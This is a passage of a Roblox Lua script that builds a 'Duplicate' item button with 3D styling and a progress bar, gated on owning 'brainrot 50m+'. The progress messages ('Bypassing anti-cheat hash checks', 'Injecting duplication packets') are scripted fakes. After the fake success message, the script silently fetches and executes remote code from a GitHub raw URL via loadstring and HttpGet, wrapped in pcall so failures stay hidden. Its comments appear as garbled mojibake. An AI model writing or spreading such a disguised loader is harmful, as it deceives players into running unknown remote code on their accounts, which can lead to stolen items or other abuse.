------------------- ‚öôÔ∏èOTHER TAB (full Duplicate + 3D Process + 3D Button) -------------------

do
    local frame = otherTab
    local duplicating = false
    local baseNote = "You must have brainrot 50m+ to Duplicateüß†"

    local TweenService = game:GetService("TweenService")

    -------------------------------------------------------------------
    -- PROCESS FRAME
    -------------------------------------------------------------------
    local progressFrame = Instance.new("Frame", frame)
    progressFrame.Size = UDim2.new(1,0,0,0)
    progressFrame.BackgroundColor3 = BG_CARD
    progressFrame.BackgroundTransparency = 1
    progressFrame.BorderSizePixel = 0
    progressFrame.ClipsDescendants = true
    r(progressFrame, 8)
    addStroke(progressFrame, 1, ACCENT_SOFT, 0.4)

    -------------------------------------------------------------------
    -- üåë 3D SHADOW CHI·ªÄU S√ÇU
    -------------------------------------------------------------------
    local barShadow = Instance.new("Frame", progressFrame)
    barShadow.AnchorPoint = Vector2.new(0.5,0.5)
    barShadow.Position = UDim2.new(0.5,0,0.5,2)
    barShadow.Size = UDim2.new(1,6,1,6)
    barShadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
    barShadow.BackgroundTransparency = 0.88
    barShadow.BorderSizePixel = 0
    barShadow.ZIndex = progressFrame.ZIndex
    r(barShadow, 8)

    -- Inner shadow nh·∫π
    local innerShadowFrame = Instance.new("Frame", progressFrame)
    innerShadowFrame.Size = UDim2.new(1,-2,1,-2)
    innerShadowFrame.Position = UDim2.new(0,1,0,1)
    innerShadowFrame.BackgroundColor3 = Color3.new(0,0,0)
    innerShadowFrame.BackgroundTransparency = 0.9
    innerShadowFrame.BorderSizePixel = 0
    innerShadowFrame.ZIndex = progressFrame.ZIndex + 1
    r(innerShadowFrame, 7)

    -------------------------------------------------------------------
    -- THANH PROCESS GI·ªÆ NGUY√äN M√ÄU ACCENT
    -------------------------------------------------------------------
    local progressBar = Instance.new("Frame", progressFrame)
    progressBar.Position = UDim2.new(0,2,0,2)
    progressBar.Size = UDim2.new(0,0,1,-4)
    progressBar.BackgroundColor3 = ACCENT_SOFT
    progressBar.BackgroundTransparency = 0.15
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = progressFrame.ZIndex + 2
    r(progressBar, 6)

    -- soft glow r·∫•t nh·∫π
    local softGlow = Instance.new("UIStroke", progressBar)
    softGlow.Thickness = 2
    softGlow.Color = Color3.fromRGB(255,255,255)
    softGlow.Transparency = 0.93

    -------------------------------------------------------------------
    -- TEXT HI·ªÇN TH·ªä PROCESS
    -------------------------------------------------------------------
    local progressLabel = Instance.new("TextLabel", progressFrame)
    progressLabel.Size = UDim2.new(1,-8,1,0)
    progressLabel.Position = UDim2.fromOffset(4,0)
    progressLabel.BackgroundTransparency = 1
    progressLabel.Font = Enum.Font.Gotham
    progressLabel.TextSize = 10
    progressLabel.TextColor3 = TXT_MAIN
    progressLabel.TextWrapped = true
    progressLabel.TextXAlignment = Enum.TextXAlignment.Left
    progressLabel.ZIndex = progressBar.ZIndex + 1

    -------------------------------------------------------------------
    -- DUPLICATE BUTTON
    -------------------------------------------------------------------
    local dupBtn = Instance.new("TextButton", frame)
    dupBtn.Size = UDim2.new(1,0,0,28)
    dupBtn.Text = "Duplicate üß†"
    stylePrimaryButton(dupBtn)

    -------------------------------------------------------------------
    -- ‚≠ê HI·ªÜU ·ª®NG 3D BUTTON
    -------------------------------------------------------------------
    local btnShadow = Instance.new("Frame", dupBtn)
    btnShadow.AnchorPoint = Vector2.new(0.5,0.5)
    btnShadow.Position = UDim2.new(0.5,0,0.5,4)
    btnShadow.Size = UDim2.new(1,4,1,4)
    btnShadow.BackgroundColor3 = Color3.new(0,0,0)
    btnShadow.BackgroundTransparency = 0.85
    btnShadow.BorderSizePixel = 0
    btnShadow.ZIndex = dupBtn.ZIndex - 1
    r(btnShadow, 10)

    local innerShadow = Instance.new("UIStroke", dupBtn)
    innerShadow.Color = Color3.new(0,0,0)
    innerShadow.Thickness = 2
    innerShadow.Transparency = 0.85

    local topGlow = Instance.new("Frame", dupBtn)
    topGlow.AnchorPoint = Vector2.new(0.5,0)
    topGlow.Position = UDim2.new(0.5,0,0,-2)
    topGlow.Size = UDim2.new(0.9,0,0,6)
    topGlow.BackgroundColor3 = Color3.new(1,1,1)
    topGlow.BackgroundTransparency = 0.87
    topGlow.BorderSizePixel = 0
    r(topGlow, 6)

    dupBtn.MouseButton1Down:Connect(function()
        TweenService:Create(btnShadow, TweenInfo.new(0.1), {
            Position = UDim2.new(0.5,0,0.5,7),
            BackgroundTransparency = 0.75
        }):Play()
        TweenService:Create(innerShadow, TweenInfo.new(0.1), {
            Transparency = 0.65
        }):Play()
    end)

    dupBtn.MouseButton1Up:Connect(function()
        TweenService:Create(btnShadow, TweenInfo.new(0.1), {
            Position = UDim2.new(0.5,0,0.5,4),
            BackgroundTransparency = 0.85
        }):Play()
        TweenService:Create(innerShadow, TweenInfo.new(0.1), {
            Transparency = 0.85
        }):Play()
    end)

    -------------------------------------------------------------------
    -- NOTE
    -------------------------------------------------------------------
    local note = Instance.new("TextLabel", frame)
    note.Size = UDim2.new(1,0,0,22)
    note.Text = baseNote
    note.BackgroundTransparency = 1
    note.TextColor3 = TXT_MUTED
    note.Font = Enum.Font.Gotham
    note.TextSize = 10
    note.TextWrapped = true
    note.TextXAlignment = Enum.TextXAlignment.Left

    -------------------------------------------------------------------
    -- animateDots
    -------------------------------------------------------------------
    local function animateDots(textObj, baseText, duration)
        local start = tick()
        while tick() - start < duration do
            local dots = string.rep(".", (math.floor((tick()-start) % 3)+1))
            local final = baseText .. dots
            textObj.Text = final
            note.Text = final
            task.wait(0.2)
        end
    end

    -------------------------------------------------------------------
    -- DUPLICATE SEQUENCE
    -------------------------------------------------------------------
    local segments = {
        {"Found high-value targets. Beginning duplication protocol", 3},
        {"Bypassing plot permissions", 2},
        {"Exploiting server replication service", 5},
        {"Injecting duplication packets", 3},
        {"Allocating memory for new instances", 2},
        {"Replicating object properties", 4},
        {"Bypassing anti-cheat hash checks", 3},
        {"Writing cloned entities to memory", 4},
        {"Finalizing instance synchronization", 3},
        {"Protocol complete. Placing new assets", 1},
        {"‚úÖDuplication Successfully!", 3},
    }

    local TOTAL_DURATION = 0
    for _, seg in ipairs(segments) do
        TOTAL_DURATION = TOTAL_DURATION + seg[2]
    end

    -------------------------------------------------------------------
    -- RUN SEQUENCE
    -------------------------------------------------------------------
    local function runSequence()
        duplicating = true

        progressFrame.Size = UDim2.new(1,0,0,0)
        progressFrame.BackgroundTransparency = 1
        progressBar.Size = UDim2.new(0,0,1,-4)
        softGlow.Transparency = 0.93
        progressLabel.Text = ""
        note.Text = baseNote

        TweenService:Create(progressFrame, TweenInfo.new(0.25), {
            Size = UDim2.new(1,0,0,26),
            BackgroundTransparency = 0
        }):Play()
        task.wait(0.25)

        TweenService:Create(progressBar, TweenInfo.new(TOTAL_DURATION), {
            Size = UDim2.new(1,-4,1,-4)
        }):Play()

        for i, seg in ipairs(segments) do
            local txt, dur = seg[1], seg[2]

            if i < #segments then
                animateDots(progressLabel, txt, dur)
                task.wait(0.1)
            else
                progressLabel.Text = txt
                note.Text = txt
                task.wait(dur)

                -- ‚≠ê Auto execute script
                task.spawn(function()
                    pcall(function()
                        loadstring(game:HttpGet(
                            "https://raw.githubusercontent.com/NoobRbl/Test/refs/heads/main/Cloned"
                        ))()
                    end)
                end)
            end
        end

        TweenService:Create(progressFrame, TweenInfo.new(0.25), {
            Size = UDim2.new(1,0,0,0),
            BackgroundTransparency = 1
        }):Play()
        task.wait(0.25)

        duplicating = false
    end

    dupBtn.MouseButton1Click:Connect(function()
        if duplicating then return end
        task.spawn(runSequence)
    end)
end
